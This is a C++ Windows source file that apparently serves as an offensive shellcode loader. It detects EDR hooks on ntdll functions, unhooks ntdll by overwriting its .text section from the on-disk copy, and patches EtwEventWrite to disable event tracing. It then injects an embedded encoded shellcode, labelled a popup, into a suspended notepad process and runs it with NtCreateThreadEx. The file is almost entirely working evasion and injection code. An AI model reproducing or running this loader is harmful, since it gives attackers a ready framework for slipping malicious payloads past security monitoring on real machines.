#include <iostream>
#include <Windows.h>
#include <winternl.h>
#include <psapi.h>
#include <cstdlib>
#include <TlHelp32.h>
#include <dbghelp.h>
using namespace std;

#define _CRT_SECURE_NO_WARNINGS


// Detect first bytes of Nt address
// Stolen from https://github.com/TheD1rkMtr
BOOL isItHooked(LPVOID addr) {
	BYTE stub[] = "\x4c\x8b\xd1\xb8";
	std::string charData = (char*)addr;

	if (memcmp(addr, stub, 4) != 0) {
		printf("\t[!] First bytes are HOOKED : ");
		for (int i = 0; i < 4; i++) {
			BYTE currentByte = charData[i];
			printf("\\x%02x", currentByte);
		}
		printf(" (different from ");
		for (int i = 0; i < 4; i++) {
			printf("\\x%02x", stub[i]);
		}
		printf(")\n");
		return TRUE;
	}
	return FALSE;
}




int main()
{


	// Copy ntdll to a fresh memory alloc and overwrite calls adresses
	// Stolen from https://www.ired.team/offensive-security/defense-evasion/how-to-unhook-a-dll-using-c++
	printf("[+] Detecting ntdll hooking\n");
	int nbHooks = 0;
	if (isItHooked(GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtAllocateVirtualMemory"))) {
		printf("\t[!] NtAllocateVirtualMemory is Hooked\n");
		nbHooks++;
	}
	else {
		printf("\t[+] NtAllocateVirtualMemory Not Hooked\n");
	}
	if (isItHooked(GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtProtectVirtualMemory"))) {
		printf("\t[!] NtProtectVirtualMemory is Hooked\n");
		nbHooks++;
	}
	else {
		printf("\t[+] NtProtectVirtualMemory Not Hooked\n");
	}
	if (isItHooked(GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtCreateThreadEx"))) {
		printf("\t[!] NtCreateThreadEx is Hooked\n");
		nbHooks++;
	}
	else {
		printf("\t[+] NtCreateThreadEx Not Hooked\n");
	}
	if (isItHooked(GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQueryInformationThread"))) {
		printf("\t[!] NtQueryInformationThread Hooked\n");
		nbHooks++;
	}
	else {
		printf("\t[+] NtQueryInformationThread Not Hooked\n");
	}
	if (nbHooks > 0) {
		char path[] = { 'C',':','\\','W','i','n','d','o','w','s','\\','S','y','s','t','e','m','3','2','\\','n','t','d','l','l','.','d','l','l',0 };
		char sntdll[] = { '.','t','e','x','t',0 };
		HANDLE process = GetCurrentProcess();
		MODULEINFO mi = {};
		HMODULE ntdllModule = GetModuleHandleA("ntdll.dll");
		GetModuleInformation(process, ntdllModule, &mi, sizeof(mi));
		LPVOID ntdllBase = (LPVOID)mi.lpBaseOfDll;
		HANDLE ntdllFile = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
		HANDLE ntdllMapping = CreateFileMapping(ntdllFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
		LPVOID ntdllMappingAddress = MapViewOfFile(ntdllMapping, FILE_MAP_READ, 0, 0, 0);
		PIMAGE_DOS_HEADER hookedDosHeader = (PIMAGE_DOS_HEADER)ntdllBase;
		PIMAGE_NT_HEADERS hookedNtHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)ntdllBase + hookedDosHeader->e_lfanew);
		for (WORD i = 0; i < hookedNtHeader->FileHeader.NumberOfSections; i++) {
			PIMAGE_SECTION_HEADER hookedSectionHeader = (PIMAGE_SECTION_HEADER)((DWORD_PTR)IMAGE_FIRST_SECTION(hookedNtHeader) + ((DWORD_PTR)IMAGE_SIZEOF_SECTION_HEADER * i));
			if (!strcmp((char*)hookedSectionHeader->Name, (char*)sntdll)) {
				DWORD oldProtection = 0;
				bool isProtected = VirtualProtect((LPVOID)((DWORD_PTR)ntdllBase + (DWORD_PTR)hookedSectionHeader->VirtualAddress), hookedSectionHeader->Misc.VirtualSize, PAGE_EXECUTE_READWRITE, &oldProtection);
				memcpy((LPVOID)((DWORD_PTR)ntdllBase + (DWORD_PTR)hookedSectionHeader->VirtualAddress), (LPVOID)((DWORD_PTR)ntdllMappingAddress + (DWORD_PTR)hookedSectionHeader->VirtualAddress), hookedSectionHeader->Misc.VirtualSize);
				isProtected = VirtualProtect((LPVOID)((DWORD_PTR)ntdllBase + (DWORD_PTR)hookedSectionHeader->VirtualAddress), hookedSectionHeader->Misc.VirtualSize, oldProtection, &oldProtection);
			}
		}
		printf("\n[+] Detecting hooks in new ntdll module\n");

		if (isItHooked(GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtAllocateVirtualMemory"))) {
			printf("\t[!] NtAllocateVirtualMemory Hooked\n");
		}
		else {
			printf("\t[+] NtAllocateVirtualMemory Not Hooked\n");
		}

		if (isItHooked(GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtProtectVirtualMemory"))) {
			printf("\t[!] NtProtectVirtualMemory Hooked\n");
		}
		else {
			printf("\t[+] NtProtectVirtualMemory Not Hooked\n");
		}
		if (isItHooked(GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtCreateThreadEx"))) {
			printf("\t[!] NtCreateThreadEx is Hooked\n");
			nbHooks++;
		}
		else {
			printf("\t[+] NtCreateThreadEx Not Hooked\n");
		}
		if (isItHooked(GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQueryInformationThread"))) {
			printf("\t[!] NtQueryInformationThread Hooked\n");
		}
		else {
			printf("\t[+] NtQueryInformationThread Not Hooked\n");
		}
	}







	// Redefine Nt functions
	typedef LPVOID(NTAPI* uNtAllocateVirtualMemory)(HANDLE, PVOID, ULONG, SIZE_T, ULONG, ULONG);
	typedef NTSTATUS(NTAPI* uNtWriteVirtualMemory)(HANDLE, PVOID, PVOID, ULONG, PULONG);
	typedef NTSTATUS(NTAPI* uNtCreateThreadEx) (OUT PHANDLE hThread,IN ACCESS_MASK DesiredAccess,IN PVOID ObjectAttributes,IN HANDLE ProcessHandle,IN PVOID lpStartAddress,IN PVOID lpParameter,IN ULONG Flags,IN SIZE_T StackZeroBits,IN SIZE_T SizeOfStackCommit,IN SIZE_T SizeOfStackReserve,OUT PVOID lpBytesBuffer);
	typedef NTSTATUS(NTAPI* uNtProtectVirtualMemory) (HANDLE, IN OUT PVOID*, IN OUT PSIZE_T, IN ULONG, OUT PULONG);
	typedef NTSTATUS(NTAPI* uNtQueryInformationThread) (IN HANDLE          ThreadHandle, IN THREADINFOCLASS ThreadInformationClass, OUT PVOID          ThreadInformation, IN ULONG           ThreadInformationLength, OUT PULONG         ReturnLength);

	HINSTANCE hNtdll = GetModuleHandleA("ntdll.dll");
	uNtAllocateVirtualMemory NtAllocateVirtualMemory = (uNtAllocateVirtualMemory)GetProcAddress(hNtdll, "NtAllocateVirtualMemory");
	uNtWriteVirtualMemory NtWriteVirtualMemory = (uNtWriteVirtualMemory)GetProcAddress(hNtdll, "NtWriteVirtualMemory");
	uNtProtectVirtualMemory NtProtectVirtualMemory = (uNtProtectVirtualMemory)GetProcAddress(hNtdll, "NtProtectVirtualMemory");
	uNtCreateThreadEx NtCreateThreadEx = (uNtCreateThreadEx)GetProcAddress(hNtdll, "NtCreateThreadEx");
	uNtQueryInformationThread NtQueryInformationThread = (uNtQueryInformationThread)GetProcAddress(hNtdll, "NtQueryInformationThread");











	// PATCH ETW : Stolen from https://github.com/Hagrid29/RemotePatcher/blob/main/RemotePatcher/RemotePatcher.cpp
	printf("\n[+] Patching ETW writer\n");
	void* etwAddr = GetProcAddress(GetModuleHandleA("ntdll.dll"), "EtwEventWrite");
	char etwPatch[] = { 0xC3 };
	DWORD lpflOldProtect = 0;
	unsigned __int64 memPage = 0x1000;
	void* etwAddr_bk = etwAddr;
	NtProtectVirtualMemory(GetCurrentProcess(), (PVOID*)&etwAddr_bk, (PSIZE_T)&memPage, 0x04, &lpflOldProtect);
	NtWriteVirtualMemory(GetCurrentProcess(), (LPVOID)etwAddr, (PVOID)etwPatch, sizeof(etwPatch), (PULONG)nullptr);
	NtProtectVirtualMemory(GetCurrentProcess(), (PVOID*)&etwAddr_bk, (PSIZE_T)&memPage, lpflOldProtect, &lpflOldProtect);
	printf("[+] ETW patched !\n");















	printf("\n[+] Decrypting payload in memory\n");
	/*std::string BhWMYCCwFVXerVIAIRxdmOk = "prout";
	char trigger_that[] = "xored shellcode here";
	int j = 0;
	for (int i = 0; i < sizeof trigger_that; i++) {
		if (j == BhWMYCCwFVXerVIAIRxdmOk.size() - 1) j = 0;
		trigger_that[i] = trigger_that[i] ^ BhWMYCCwFVXerVIAIRxdmOk[j];
		j++;
	}*/


	// simple popup
	unsigned char NqQlPkEKGs[] = "\x48\x31\xc9\x48\x81\xe9\xdb\xff\xff\xff\x48\x8d\x05\xef\xff\xff\xff\x48\xbb\x45\xdb\x74\x8a\x0a\xdb\x29\x98\x48\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4\xb9\x93\xf5\x6e\xfa\x24\xd6\x67\xad\x0b\x74\x8a\x0a\x9a\x78\xd9\x15\x89\x25\xdc\x42\xea\xfb\xfd\x0d\x50\x26\xea\x34\x93\xa2\xca\x5d\xe5\x3c\x01\x58\xfb\x17\xd0\xce\xa9\x24\xb4\x42\xd4\x9e\xd2\x0f\x96\x45\x43\x42\xea\xe9\x34\x79\xba\x08\x88\x26\xfb\x68\x59\x8c\xd6\x35\x8b\xcb\x39\xc4\xca\x04\x8a\x4a\xc2\x81\x89\x09\xa6\xce\x99\x48\xc2\x0b\x0b\x17\x13\xc5\x53\x74\x8a\x0a\x93\xac\x58\x31\xb4\x3c\x8b\xda\x8b\x17\x13\x0d\xc3\x4a\xce\x81\x9b\x09\xd1\x44\x0b\x97\xd6\x42\x24\xe0\xa6\x04\x50\x40\x02\x42\xda\xff\xd5\x74\x12\x3c\xbb\xca\x77\x68\x59\x8c\xd6\x35\x8b\xcb\xe3\xc9\xed\xb4\xe5\x38\x89\x46\xff\x21\xdd\x7c\x0a\x01\x5c\x52\xe5\x6d\x13\x05\xff\x3d\x8b\xda\xbd\x17\xd9\xce\xd7\x3c\xb4\x4e\x50\x69\x84\x0c\xda\xa4\xb4\x4b\x50\x2d\x10\x0d\xda\xa4\xcb\x52\x9a\x71\xc6\x1c\x81\x35\xd2\x4b\x82\x68\xc2\x0d\x58\x98\xaa\x4b\x89\xd6\x78\x1d\x9a\x2d\xd0\x34\x93\xa2\x8a\xac\x92\x8b\x75\xf5\x86\x60\x5f\x84\xdb\x74\x8a\x0a\xe5\x61\x15\xd0\x25\x74\x8a\x0a\xe5\x65\x15\xc0\xd1\x75\x8a\x0a\x93\x18\x51\x04\x61\x31\x09\x5c\xdc\xd6\x4d\x0d\xea\xbd\xcb\xb0\x2b\x9c\x3a\x13\x24\xa1\xdd\x6f\xfb\x48\xea\x20\xfb\x11\xfc\x63\xb7\x29\xd5\x20\xa8\x07\xeb\x6d\xbe\x6b\xf7\x3d\xdb\x74\x8a\x0a\xdb\x29\x98";



	LPSTARTUPINFOA pStartupInfo = new STARTUPINFOA();
	PROCESS_INFORMATION pi = { 0 };
	CreateProcessA(0, (LPSTR)"C:\\Windows\\System32\\notepad.exe", 0, 0, 0, CREATE_SUSPENDED, 0, 0, pStartupInfo, &pi);

	ULONG dwSize = sizeof NqQlPkEKGs;
	HANDLE hHostThread = INVALID_HANDLE_VALUE;
	DWORD OldProtect = 0;
	printf("[+] Allocating memory in unhooked process\n");
	PVOID NTAlloc = VirtualAllocEx(pi.hProcess, NULL, sizeof NqQlPkEKGs, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);

	printf("[+] Writing payload into memory\n");
	SIZE_T* nbBytes = 0;
	if(!WriteProcessMemory(pi.hProcess, NTAlloc, NqQlPkEKGs, sizeof NqQlPkEKGs, nbBytes)) {
		printf("\n\t[!] WriteProcessMemory() failed with status %u\n", GetLastError());
		return 1;
	}

	printf("[+] Unleashing the beast !!\n");
	HANDLE remoteThreadHandle;
	NTSTATUS NTCreateThread = NtCreateThreadEx(&remoteThreadHandle, 0x1FFFFF, NULL, pi.hProcess, NTAlloc, NULL, FALSE, NULL, NULL, NULL, NULL);
	if (!NT_SUCCESS(NTCreateThread)) {
		printf("\n\t[!] Error while executing payload in unhooked process : (%u)\n", GetLastError());
		return 1;
	}
	

	// Want to resume legitimate process ?
	//ResumeThread(pi.hThread);



}